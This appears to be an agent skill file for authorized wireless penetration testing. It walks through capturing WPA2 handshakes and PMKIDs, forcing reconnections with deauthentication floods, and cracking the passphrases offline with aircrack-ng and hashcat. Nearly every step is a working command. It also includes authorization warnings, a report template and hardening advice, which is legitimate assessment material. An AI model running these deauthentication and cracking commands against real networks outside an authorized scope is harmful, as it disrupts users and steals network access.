---
name: performing-wifi-password-cracking-with-aircrack
description: Captures WPA/WPA2 handshakes and performs offline password cracking using aircrack-ng, hashcat, and dictionary attacks during authorized wireless security assessments to evaluate passphrase strength and wireless network security posture.
subdomain: network-security
facing: config
mitre_attack:
- T1046
- T1040
- T1557
- T1071
- T1591
nist_csf:
- PR.IR-01
- DE.CM-01
- ID.AM-03
- PR.DS-02
upstream: performing-wifi-password-cracking-with-aircrack@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.

Not for: wireless networks without explicit written authorization, for disrupting wireless communications, or for capturing handshakes of networks you do not have permission to test.

## Prerequisites

- Written authorization specifying in-scope SSIDs and wireless networks
- Wireless adapter with monitor mode and packet injection support (Alfa AWUS036ACH, Alfa AWUS036ACM, or similar)
- Kali Linux with aircrack-ng suite, hashcat, and hcxtools installed
- Password wordlists (rockyou.txt, SecLists, or custom organization-specific lists)
- GPU-capable system for hashcat acceleration (optional but recommended for large wordlists)

## Workflow

### Step 1: Prepare Wireless Interface

```bash
# Identify wireless interfaces
iwconfig
# or
iw dev

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Output: monitor mode enabled on wlan0mon

# Verify monitor mode
iwconfig wlan0mon
# Mode should show "Monitor"

# Alternatively, enable monitor mode manually
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

### Step 2: Scan for Target Networks

```bash
# Scan all channels for access points
sudo airodump-ng wlan0mon

# Output columns:
# BSSID          PWR  Beacons  #Data  CH  ENC   CIPHER  AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -45    120    35   6  WPA2  CCMP    PSK   TargetNetwork

# Identify the target network parameters:
# - BSSID (MAC address of the access point)
# - Channel number
# - Encryption type (WPA2-PSK is the target)
# - Connected clients (in the lower section)

# Focus scanning on the target channel
sudo airodump-ng wlan0mon --channel 6 --bssid AA:BB:CC:DD:EE:FF -w capture
```

### Step 3: Capture WPA2 4-Way Handshake

```bash
# Method 1: Wait for a client to connect naturally
# Keep airodump-ng running and wait for "WPA handshake: AA:BB:CC:DD:EE:FF" message
sudo airodump-ng wlan0mon --channel 6 --bssid AA:BB:CC:DD:EE:FF -w handshake_capture

# Method 2: Deauthenticate a client to force reconnection (active)
# In a separate terminal, send deauth packets to a specific client
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Or deauth all clients (broadcast)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Method 3: Capture PMKID from the AP (no client needed)
# Using hcxdumptool
sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid_capture.pcapng \
  --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2

# Wait for "PMKID" message, then convert for hashcat
hcxpcapngtool -o pmkid_hash.hc22000 pmkid_capture.pcapng

# Verify handshake was captured
aircrack-ng handshake_capture-01.cap
# Should show: "1 handshake" next to the target BSSID

# Alternative verification with cowpatty
cowpatty -r handshake_capture-01.cap -c
```

### Step 4: Crack with Aircrack-ng (CPU-based)

```bash
# Crack using rockyou wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake_capture-01.cap

# Use multiple wordlists
aircrack-ng -w /usr/share/wordlists/rockyou.txt,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt \
  -b AA:BB:CC:DD:EE:FF handshake_capture-01.cap

# Crack with a specific ESSID
aircrack-ng -w /usr/share/wordlists/rockyou.txt -e "TargetNetwork" handshake_capture-01.cap

# If successful, output shows:
# KEY FOUND! [ password123 ]
```

### Step 5: Crack with Hashcat (GPU-accelerated)

```bash
# Convert capture to hashcat format
# For handshake captures:
hcxpcapngtool -o hashcat_input.hc22000 handshake_capture-01.cap

# Or use aircrack-ng conversion
aircrack-ng handshake_capture-01.cap -j hashcat_input

# Dictionary attack with hashcat
hashcat -m 22000 hashcat_input.hc22000 /usr/share/wordlists/rockyou.txt

# Rule-based attack (transforms dictionary words)
hashcat -m 22000 hashcat_input.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force 8-character numeric passwords
hashcat -m 22000 hashcat_input.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Combination attack (two wordlists combined)
hashcat -m 22000 hashcat_input.hc22000 -a 1 wordlist1.txt wordlist2.txt

# Mask attack for common patterns (Word + 4 digits)
hashcat -m 22000 hashcat_input.hc22000 -a 3 -1 ?l?u ?1?1?1?1?1?d?d?d?d

# For PMKID-specific hashes
hashcat -m 22000 pmkid_hash.hc22000 /usr/share/wordlists/rockyou.txt

# Show cracked password
hashcat -m 22000 hashcat_input.hc22000 --show
```

### Step 6: Document and Clean Up

```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restart networking services
sudo systemctl restart NetworkManager

# Generate report
cat > wifi_assessment_report.txt << 'EOF'
WiFi Security Assessment Results
=================================
Target SSID: TargetNetwork
BSSID: AA:BB:CC:DD:EE:FF
Encryption: WPA2-PSK (CCMP)
Channel: 6

Handshake Capture: Successful (Method: Client deauthentication)
Cracking Result: PASSWORD FOUND
Password: [documented securely]
Time to Crack: 3 minutes 47 seconds (rockyou.txt, hashcat GPU)

Recommendation: Change to a passphrase of 15+ characters with mixed case,
numbers, and symbols, or migrate to WPA2/WPA3-Enterprise with 802.1X.
EOF

# Securely handle capture files (contain sensitive authentication material)
sha256sum handshake_capture-01.cap > evidence_hashes.txt
# Transfer to secure evidence storage per engagement agreement
```

## Key Concepts

| Term | Definition |
|------|------------|
| **4-Way Handshake** | WPA/WPA2 authentication exchange between client and AP that derives session keys from PSK, captured for offline password cracking |
| **PMKID** | Pairwise Master Key Identifier included in first EAPOL frame from AP, allowing password cracking without capturing full handshake or requiring connected client |
| **Monitor Mode** | Wireless interface mode that captures all wireless frames on channel without associating with any access point |
| **Deauthentication Attack** | Sending forged 802.11 management frames to disconnect client from AP, forcing reconnection that generates capturable handshake |
| **PSK (Pre-Shared Key)** | Static password used by all users to authenticate to WPA/WPA2-Personal network, vulnerable to offline dictionary attacks |
| **802.1X/EAP** | Enterprise wireless authentication using RADIUS that provides per-user credentials, eliminating shared password vulnerability |

## Tools & Systems

- **aircrack-ng suite**: Comprehensive wireless security toolkit including airodump-ng (capture), aireplay-ng (injection), and aircrack-ng (cracking)
- **hashcat**: GPU-accelerated password cracker supporting WPA/WPA2 handshakes (mode 22000) with dictionary, rule, and mask attacks
- **hcxtools**: Tools for capturing PMKID and converting wireless captures to hashcat-compatible formats
- **hcxdumptool**: Capture tool specifically designed for PMKID extraction without requiring client deauthentication
- **cowpatty**: WPA/WPA2 cracking tool with precomputed hash table support for faster dictionary attacks

### Scenario: Wireless Penetration Test for Corporate Office

**Context**: Financial services company wants to assess security of their wireless networks. They have three SSIDs: Corp-WiFi (WPA2-Enterprise for employees), Guest-WiFi (WPA2-PSK for visitors), and IoT-WiFi (WPA2-PSK for IoT devices). Assessment is authorized to test all three networks.

**Approach**:
1. Scan for all three SSIDs and identify their BSSIDs, channels, and encryption types
2. Verify that Corp-WiFi uses 802.1X/EAP by examining beacon frames -- confirmed, no PSK to crack
3. Capture the 4-way handshake for Guest-WiFi by deauthenticating connected device and capturing reconnection
4. Run hashcat with rockyou.txt against Guest-WiFi handshake -- password "Welcome2024!" cracked in 47 seconds
5. Capture PMKID from IoT-WiFi access point (no client deauth needed) and crack with hashcat -- password "iot12345" found in 12 seconds
6. Demonstrate that Guest-WiFi and IoT-WiFi passwords are weak and easily crackable
7. Recommend migrating Guest-WiFi to captive portal with per-session passwords and strengthening IoT-WiFi to a 20+ character passphrase

**Pitfalls**:
- Sending excessive deauth frames that disrupt legitimate wireless users beyond test scope
- Not using wireless adapter that supports target network's frequency band (2.4 GHz vs 5 GHz)
- Attempting to crack WPA3-SAE networks with traditional handshake capture (SAE is resistant to offline attacks)
- Running GPU cracking on shared systems without monitoring temperature and power consumption

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/performing-wifi-password-cracking-with-aircrack
